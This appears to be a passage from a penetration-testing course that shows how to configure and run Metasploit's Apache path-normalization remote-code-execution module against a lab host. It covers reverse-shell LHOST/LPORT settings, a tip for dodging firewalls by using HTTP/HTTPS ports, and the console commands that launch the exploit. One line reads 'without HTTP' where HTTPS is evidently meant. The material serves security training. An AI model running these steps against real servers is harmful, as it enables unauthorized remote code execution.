# Listing 644 - Set payload of the exploit module

The output shows that the entered payload is now active for the exploit module. There are two options for the payload named LHOST (the local host IP address or interface) and LPORT (the local port), which are used for the reverse shell to connect.

By default, most modules use the port 4444 in the LPORT payload option. Depending on our machine's configuration, Metasploit may already set the LHOST value for us. We should always double-check this value, especially if our machine contains multiple interfaces, because Metasploit may reference the wrong interface to set this value.

> In penetration tests we may face the situation that port 4444 is blocked by firewalls or other security technologies. This is common as it is the default for Metasploit modules. In simulations like this, changing the port number to ports associated with more commonly used protocols such as HTTP or HTTPS may lead to a successful execution of the selected payload.

Now note that we don't need to start a listener manually with tools like Netcat to receive the incoming reverse shell. Metasploit automatically sets a listener matching the specified payload.

Now, let's set the options SSL to false and RPORT to 80 since the target web server runs without HTTP. Then, we set RHOSTS to the target IP and enter run.

```
msf6 exploit(multi/http/apache_normalize_path_rc) > set SSL false
SSL => false
```

```
msf6 exploit(multi/http/apache_normalize_path_rc) > set RPORT 80
RPORT => 80
```

```
msf6 exploit(multi/http/apache_normalize_path_rc) > set RHOSTS 192.168.50.16
RHOSTS => 192.168.50.16
```

```
msf6 exploit(multi/http/apache_normalize_path_rc) > run
```
